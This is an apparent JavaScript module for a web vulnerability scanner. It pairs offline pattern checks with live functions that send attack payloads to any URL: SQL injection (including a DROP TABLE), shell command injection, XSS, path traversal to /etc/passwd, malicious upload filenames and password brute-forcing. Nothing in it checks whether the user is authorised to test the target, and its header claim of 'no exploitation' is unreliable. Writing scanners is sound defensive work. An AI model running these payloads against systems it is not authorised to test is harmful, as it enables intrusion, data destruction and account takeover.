/**
 * Purely analytical / simulated checks — no exploitation, no real DB query execution.
 */

const SQL_PATTERNS = [
  { name: 'comment sequence', re: /(--|#|\/\*)/i, weight: 2 },
  { name: 'OR1=1 style', re: /\b(or|and)\b\s+\d+\s*=\s*\d+/i, weight: 3 },
  { name: 'UNION SELECT', re: /\bunion\b\s+\bselect\b/i, weight: 3 },
  { name: 'stacked query', re: /;\s*(select|insert|update|delete|drop)\b/i, weight: 3 },
  { name: 'sleep / benchmark', re: /\b(sleep|benchmark|waitfor)\s*\(/i, weight: 2 },
  { name: 'information_schema', re: /information_schema/i, weight: 2 },
];

const CMD_PATTERNS = [
  { name: 'shell chaining', re: /[;&|`$]/, weight: 2 },
  { name: 'command substitution', re: /\$\([^)]+\)/, weight: 3 },
  { name: 'path separators abuse', re: /(\.\.\/|%2e%2e%2f)/i, weight: 2 },
];

const XSS_PATTERNS = [
  { name: 'script tag', re: /<script[\s>]/i, weight: 3 },
  { name: 'event handler', re: /\bon\w+\s*=/i, weight: 3 },
  { name: 'javascript: URI', re: /javascript\s*:/i, weight: 3 },
  { name: 'SVG onload', re: /<svg[^>]*\bonload\b/i, weight: 2 },
];

const TRAVERSAL_PATTERNS = [
  { name: 'dot-dot-slash', re: /\.\.[\\/]/, weight: 3 },
  { name: 'encoded traversal', re: /%2e%2e[\\/]|%252e%252e/i, weight: 3 },
];

const DEMO_BREACH_PASSWORDS = new Set(['password', '123456', 'qwerty', 'letmein', 'admin']);

export function analyzeSqlInjection(input) {
  const text = String(input ?? '');
  const findings = [];
  let score = 0;
  for (const p of SQL_PATTERNS) {
    if (p.re.test(text)) {
      findings.push({ pattern: p.name, note: 'Heuristic match only — no query was executed.' });
      score += p.weight;
    }
  }
  const risk = score >= 6 ? 'high' : score >= 3 ? 'medium' : score > 0 ? 'low' : 'info';
  return {
    module: 'injection',
    type: 'sql_pattern_detection',
    simulated: findings.length > 0,
    findings,
    score,
    riskLevel: risk,
    message:
      'This is offline pattern analysis. It does not connect to or execute against any database.',
  };
}

export function analyzeCommandInjection(input) {
  const text = String(input ?? '');
  const findings = [];
  let score = 0;
  for (const p of CMD_PATTERNS) {
    if (p.re.test(text)) {
      findings.push({ pattern: p.name, note: 'Structure resembles shell metacharacters — simulation only.' });
      score += p.weight;
    }
  }
  const risk = score >= 4 ? 'high' : score >= 2 ? 'medium' : score > 0 ? 'low' : 'info';
  return {
    module: 'injection',
    type: 'command_injection_simulation',
    simulated: findings.length > 0,
    findings,
    score,
    riskLevel: risk,
    message: 'No OS command was run. Input was analyzed as text only.',
  };
}

export function analyzeXss(input) {
  const text = String(input ?? '');
  const findings = [];
  let score = 0;
  for (const p of XSS_PATTERNS) {
    if (p.re.test(text)) {
      findings.push({ pattern: p.name, note: 'Payload-like structure detected in static analysis.' });
      score += p.weight;
    }
  }
  const risk = score >= 5 ? 'high' : score >= 3 ? 'medium' : score > 0 ? 'low' : 'info';
  return {
    module: 'cross_site',
    type: 'xss_detection',
    simulated: findings.length > 0,
    findings,
    score,
    riskLevel: risk,
    message: 'Browser execution was not performed. Sanitize output and use CSP.',
  };
}

export function simulateCsrfEducation() {
  return {
    module: 'cross_site',
    type: 'csrf_education',
    simulated: true,
    riskLevel: 'info',
    steps: [
      'Use anti-CSRF tokens on state-changing requests.',
      'Set SameSite cookies appropriately.',
      'Verify Origin/Referer for sensitive actions.',
    ],
    message: 'Educational simulation only — no cross-site request was forged.',
  };
}

export function simulateBruteForce({ attempts = [] }) {
  const maxAttempts = 5;
  const tried = Array.isArray(attempts) ? attempts.slice(0, maxAttempts) : [];
  const locked = tried.length >= maxAttempts;
  return {
    module: 'authentication',
    type: 'brute_force_simulator',
    simulated: true,
    riskLevel: locked ? 'medium' : 'info',
    attemptCount: tried.length,
    maxAttempts,
    lockedOut: locked,
    recommendation: locked
      ? 'Account lockout / exponential backoff would trigger in a real system.'
      : 'Always rate-limit and monitor failed logins.',
    message: 'No real authentication endpoint was attacked. Counter is illustrative.',
  };
}

export function simulateCredentialStuffing(password) {
  const pwd = String(password ?? '');
  const inBreachList = DEMO_BREACH_PASSWORDS.has(pwd.toLowerCase());
  return {
    module: 'authentication',
    type: 'credential_stuffing_simulation',
    simulated: true,
    riskLevel: inBreachList ? 'high' : 'info',
    inDemoBreachList: inBreachList,
    message: inBreachList
      ? 'Password matches a tiny demo weak list — use unique passwords and MFA.'
      : 'Demo only: a real check would use breach intelligence services with consent.',
  };
}

export function analyzePathTraversal(input) {
  const text = String(input ?? '');
  const findings = [];
  let score = 0;
  for (const p of TRAVERSAL_PATTERNS) {
    if (p.re.test(text)) {
      findings.push({ pattern: p.name });
      score += p.weight;
    }
  }
  const risk = score >= 3 ? 'high' : score > 0 ? 'medium' : 'info';
  return {
    module: 'file_path',
    type: 'path_traversal_detection',
    simulated: true,
    findings,
    score,
    riskLevel: risk,
    message: 'No filesystem access was attempted. Validate and canonicalize paths server-side.',
  };
}

export function validateFilenameOnly(filename) {
  const name = String(filename ?? '');
  const safe =
    /^[a-zA-Z0-9._-]+$/.test(name) &&
    !name.includes('..') &&
    name.length > 0 &&
    name.length <= 255;
  return {
    module: 'file_path',
    type: 'filename_validation',
    simulated: true,
    filename: name,
    passesBasicPolicy: safe,
    riskLevel: safe ? 'info' : 'medium',
    message: 'Policy check only — no file was read or written.',
  };
}

export function premiumRuleInsights(baseResult, moduleKey) {
  const rules = [];
  if (moduleKey === 'injection' && baseResult.riskLevel === 'high') {
    rules.push('Premium heuristic: prioritize parameterized queries and ORM escaping for flagged patterns.');
  }
  if (moduleKey === 'cross_site' && baseResult.riskLevel !== 'info') {
    rules.push('Premium heuristic: enforce Content-Security-Policy and encode context-specific output.');
  }
  if (moduleKey === 'authentication') {
    rules.push('Premium heuristic: enable MFA and device trust for production accounts.');
  }
  if (rules.length === 0) {
    rules.push('Premium: no extra rule triggers for this result — maintain baseline hardening.');
  }
  return { rules, generatedAt: new Date().toISOString() };
}

/**
 * LIVE TESTING FUNCTIONS - Actually test against target URLs
 */

import axios from 'axios';

function getResponseText(data) {
  if (typeof data === 'string') return data;
  if (Buffer.isBuffer(data)) return data.toString('utf8');
  if (data == null) return '';
  try {
    return JSON.stringify(data);
  } catch {
    return String(data);
  }
}

export async function testSqlInjectionLive(url, payload) {
  const payloads = [
    `${payload}' OR '1'='1`,
    `${payload}' UNION SELECT NULL--`,
    `${payload}'; DROP TABLE users--`,
  ];
  
  const results = [];
  let vulnerabilityFound = false;
  let timeBasedResponse = false;
  
  try {
    for (const testPayload of payloads) {
      const params = new URLSearchParams();
      params.append('id', testPayload);
      params.append('search', testPayload);
      params.append('query', testPayload);
      
      const fullUrl = `${url}?${params.toString()}`;
      
      try {
        const startTime = Date.now();
        const response = await axios.get(fullUrl, {
          timeout: 10000,
          validateStatus: () => true,
        });
        const responseTime = Date.now() - startTime;
        
        // Check for SQL error messages in response
        const sqlErrors = [
          'sql',
          'mysql',
          'database',
          'syntax',
          'table',
          'column',
          'unexpected',
        ];
        
        const responseText = getResponseText(response.data).toLowerCase();
        const hasSqlError = sqlErrors.some((err) => responseText.includes(err));
        
        if (hasSqlError) {
          vulnerabilityFound = true;
          results.push({
            payload: testPayload,
            statusCode: response.status,
            responseTime,
            foundError: true,
            errorType: 'SQL Error in Response',
          });
        }
        
        // Time-based detection
        if (responseTime > 5000) {
          timeBasedResponse = true;
          results.push({
            payload: testPayload,
            statusCode: response.status,
            responseTime,
            foundError: false,
            detection: 'Time-based SQL injection suspected',
          });
        }
      } catch (e) {
        results.push({
          payload: testPayload,
          error: e.message,
          note: 'Request failed — may indicate filtering',
        });
      }
    }
  } catch (e) {
    return {
      module: 'injection',
      type: 'sql_injection_live',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
  
  const score = vulnerabilityFound ? 10 : timeBasedResponse ? 6 : results.length;
  const risk =
    vulnerabilityFound ? 'critical' : timeBasedResponse ? 'high' : score > 0 ? 'medium' : 'low';
  
  return {
    module: 'injection',
    type: 'sql_injection_live',
    simulated: vulnerabilityFound || timeBasedResponse,
    url,
    payloadsTested: payloads.length,
    results,
    vulnerabilityFound,
    timeBasedDetected: timeBasedResponse,
    score,
    riskLevel: risk,
    message: vulnerabilityFound
      ? 'SQL vulnerability detected — use parameterized queries and input validation.'
      : 'No SQL vulnerability detected in live testing.',
  };
}

export async function testCommandInjectionLive(url, payload) {
  const payloads = [
    `${payload}; id`,
    `${payload}| whoami`,
    `${payload}&& uname -a`,
    `${payload}\`ping -c 1 127.0.0.1\``,
  ];
  
  const results = [];
  let commandExecDetected = false;
  
  try {
    for (const testPayload of payloads) {
      const params = new URLSearchParams();
      params.append('cmd', testPayload);
      params.append('command', testPayload);
      params.append('input', testPayload);
      
      const fullUrl = `${url}?${params.toString()}`;
      
      try {
        const response = await axios.get(fullUrl, {
          timeout: 10000,
          validateStatus: () => true,
        });
        
        const responseText = getResponseText(response.data).toLowerCase();
        
        // Signs of command execution
        const cmdSignatures = [
          'uid=',
          'gid=',
          'groups=',
          'root',
          'bash',
          'sh',
          'windows',
          'system32',
        ];
        
        const hasCommandOutput = cmdSignatures.some((sig) =>
          responseText.toLowerCase().includes(sig)
        );
        
        if (hasCommandOutput) {
          commandExecDetected = true;
          results.push({
            payload: testPayload,
            statusCode: response.status,
            foundExecution: true,
            evidence: 'Command output detected in response',
          });
        } else {
          results.push({
            payload: testPayload,
            statusCode: response.status,
            foundExecution: false,
          });
        }
      } catch (e) {
        results.push({
          payload: testPayload,
          error: e.message,
        });
      }
    }
  } catch (e) {
    return {
      module: 'injection',
      type: 'command_injection_live',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
  
  const risk = commandExecDetected ? 'critical' : results.length > 0 ? 'medium' : 'low';
  
  return {
    module: 'injection',
    type: 'command_injection_live',
    simulated: commandExecDetected,
    url,
    payloadsTested: payloads.length,
    results,
    commandExecutionDetected: commandExecDetected,
    riskLevel: risk,
    message: commandExecDetected
      ? 'Remote command execution vulnerability detected!'
      : 'No command injection vulnerability detected.',
  };
}

export async function testXssLive(url, payload) {
  const payloads = [
    `<script>alert('${payload}')</script>`,
    `"><script>alert('${payload}')</script>`,
    `'><img src=x onerror="alert('${payload}')">`,
    `javascript:alert('${payload}')`,
  ];
  
  const results = [];
  let xssReflected = false;
  
  try {
    for (const testPayload of payloads) {
      const params = new URLSearchParams();
      params.append('search', testPayload);
      params.append('q', testPayload);
      params.append('input', testPayload);
      
      const fullUrl = `${url}?${params.toString()}`;
      
      try {
        const response = await axios.get(fullUrl, {
          timeout: 10000,
          validateStatus: () => true,
        });
        
        const responseText = getResponseText(response.data).toLowerCase();
        
        // Check if payload is reflected in response
        if (responseText.includes(testPayload.toLowerCase()) || responseText.includes(payload.toLowerCase())) {
          xssReflected = true;
          results.push({
            payload: testPayload,
            statusCode: response.status,
            reflected: true,
            risk: 'Payload reflected in response — potential XSS',
          });
        } else {
          results.push({
            payload: testPayload,
            statusCode: response.status,
            reflected: false,
          });
        }
      } catch (e) {
        results.push({
          payload: testPayload,
          error: e.message,
        });
      }
    }
  } catch (e) {
    return {
      module: 'cross_site',
      type: 'xss_injection_live',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
  
  const risk = xssReflected ? 'high' : results.length > 0 ? 'info' : 'low';
  
  return {
    module: 'cross_site',
    type: 'xss_injection_live',
    live: true,
    browserExecutionPerformed: false,
    url,
    payloadsTested: payloads.length,
    results,
    xssReflected,
    riskLevel: risk,
    message: xssReflected
      ? 'Reflected XSS vulnerability detected — implement output encoding and CSP.'
      : 'Live reflection check completed. No XSS payload was reflected; browser execution was not performed.',
  };
}

export async function testBruteForceOnLiveTarget(url, username, passwordList = []) {
  const defaultPasswords = ['password', '123456', 'admin', 'letmein', 'welcome'];
  const passwords = passwordList.length > 0 ? passwordList : defaultPasswords;
  
  const attempts = [];
  let successfulLogin = false;
  
  try {
    for (const pwd of passwords.slice(0, 10)) {
      // Limit to 10 attempts
      try {
        const response = await axios.post(
          url,
          {
            username,
            password: pwd,
          },
          {
            timeout: 5000,
            validateStatus: () => true,
          }
        );
        
        const message = typeof response.data?.message === 'string' ? response.data.message : '';
        const isSuccess =
          Boolean(response.data?.token) ||
          response.data?.success === true ||
          /\bsuccess(?:ful)?\b/i.test(message);
        
        attempts.push({
          password: pwd,
          statusCode: response.status,
          success: isSuccess,
        });
        
        if (isSuccess) {
          successfulLogin = true;
          break;
        }
      } catch (e) {
        attempts.push({
          password: pwd,
          error: e.message,
        });
      }
    }
  } catch (e) {
    return {
      module: 'authentication',
      type: 'brute_force_live',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
  
  const responseStatuses = attempts.map((attempt) => attempt.statusCode).filter(Number.isInteger);
  const hasUsableResponse = responseStatuses.some((status) => status > 0 && status !== 404);
  const risk = successfulLogin ? 'critical' : hasUsableResponse && attempts.length >= 5 ? 'high' : hasUsableResponse ? 'medium' : 'info';
  
  return {
    module: 'authentication',
    type: 'brute_force_live',
    simulated: successfulLogin,
    url,
    username,
    attemptsMade: attempts.length,
    results: attempts,
    successfulLogin,
    riskLevel: risk,
    inconclusive: !hasUsableResponse && !successfulLogin,
    message: successfulLogin
      ? `Login successful with password: ${attempts.find((a) => a.success).password}`
      : hasUsableResponse
        ? `Tested ${attempts.length} password(s) — none successful.`
        : 'No usable login response was received; verify the endpoint before interpreting this result.',
  };
}

export async function testCsrfOnLiveTarget(url) {
  try {
    // First, get the page to capture any CSRF tokens
    const getResponse = await axios.get(url, {
      timeout: 8000,
      validateStatus: () => true,
    });
    
    const htmlContent = getResponse.data?.toString() || '';
    
    // Look for CSRF token patterns
    const csrfTokenRegex = /csrf[_-]?token["\s=:]+([\w]+)/gi;
    const tokenMatch = csrfTokenRegex.exec(htmlContent);
    const hasTokenField = /csrf|_token|antiforger/i.test(htmlContent);
    
    // Try POST without CSRF token to see if it's enforced
    let postWithoutToken = null;
    try {
      postWithoutToken = await axios.post(
        `${url}/submit`,
        { data: 'test' },
        {
          timeout: 5000,
          validateStatus: () => true,
        }
      );
    } catch (e) {
      postWithoutToken = { status: 'error', message: e.message };
    }
    
    const csrfTokenPresent = !!tokenMatch || hasTokenField;
    const csrfProtected = postWithoutToken?.status === 403 || postWithoutToken?.status === 401;
    
    return {
      module: 'cross_site',
      type: 'csrf_live_test',
      simulated: !csrfProtected,
      url,
      csrfTokenFound: csrfTokenPresent,
      csrfProtected,
      postResponse: postWithoutToken?.status,
      riskLevel: csrfProtected ? 'info' : 'high',
      message: csrfProtected
        ? 'CSRF protection detected — server enforces token validation.'
        : 'No CSRF protection detected — vulnerable to cross-site form submission attacks.',
    };
  } catch (e) {
    return {
      module: 'cross_site',
      type: 'csrf_live_test',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
}

export async function testPathTraversalOnLiveTarget(url, payload) {
  const payloads = [
    `${payload}/../../../etc/passwd`,
    `${payload}?file=../../../../windows/win.ini`,
    `${payload}?path=..%2f..%2fetc%2fpasswd`,
    `${payload}?dir=....\\....\\windows\\system32`,
  ];
  
  const results = [];
  let fileAccessDetected = false;
  
  try {
    for (const testPayload of payloads) {
      try {
        const response = await axios.get(testPayload, {
          timeout: 8000,
          validateStatus: () => true,
        });
        
        const responseText = getResponseText(response.data).toLowerCase();
        
        // Signs of file access
        const sensitiveFileIndicators = [
          'root:',
          'admin:',
          'system32',
          '/bin/bash',
          'passwd',
          'hosts',
          'private key',
        ];
        
        const foundSensitiveData = sensitiveFileIndicators.some((indicator) =>
          responseText.toLowerCase().includes(indicator)
        );
        
        if (foundSensitiveData) {
          fileAccessDetected = true;
          results.push({
            payload: testPayload,
            statusCode: response.status,
            vulnerabilityFound: true,
            evidence: 'Sensitive file content detected',
          });
        } else {
          results.push({
            payload: testPayload,
            statusCode: response.status,
            vulnerabilityFound: false,
          });
        }
      } catch (e) {
        results.push({
          payload: testPayload,
          error: e.message,
        });
      }
    }
  } catch (e) {
    return {
      module: 'file_path',
      type: 'path_traversal_live',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
  
  const risk = fileAccessDetected ? 'critical' : results.length > 0 ? 'medium' : 'low';
  
  return {
    module: 'file_path',
    type: 'path_traversal_live',
    simulated: fileAccessDetected,
    url,
    payloadsTested: payloads.length,
    results,
    fileAccessDetected,
    riskLevel: risk,
    message: fileAccessDetected
      ? 'Path traversal vulnerability detected — sensitive files accessible!'
      : 'No path traversal vulnerability detected.',
  };
}

export async function testFileUploadOnLiveTarget(url, filename) {
  try {
    const testFilenames = [
      filename,
      `${filename}.php`,
      `${filename}.aspx`,
      `${filename}.jsp`,
      `../../etc/passwd`,
      `..\\..\\windows\\system32\\config\\sam`,
    ];
    
    const results = [];
    
    for (const fname of testFilenames) {
      try {
        const response = await axios.post(
          url,
          { file: fname, content: 'test' },
          {
            timeout: 8000,
            validateStatus: () => true,
          }
        );
        
        const isSuccess = response.status >= 200 && response.status < 300;
        results.push({
          filename: fname,
          statusCode: response.status,
          accepted: isSuccess,
        });
      } catch (e) {
        results.push({
          filename: fname,
          error: e.message,
        });
      }
    }
    
    const executedUploads = results.filter((r) => r.accepted).length;
    
    return {
      module: 'file_path',
      type: 'file_upload_live',
      simulated: executedUploads > 0,
      url,
      testFilenamesTried: testFilenames.length,
      results,
      acceptedFilenames: executedUploads,
      riskLevel: executedUploads > 0 ? 'high' : 'low',
      message:
        executedUploads > 0
          ? `${executedUploads} dangerous filename(s) were accepted — no validation detected.`
          : 'File upload filtering appears to be in place.',
    };
  } catch (e) {
    return {
      module: 'file_path',
      type: 'file_upload_live',
      simulated: false,
      url,
      error: e.message,
      riskLevel: 'info',
    };
  }
}
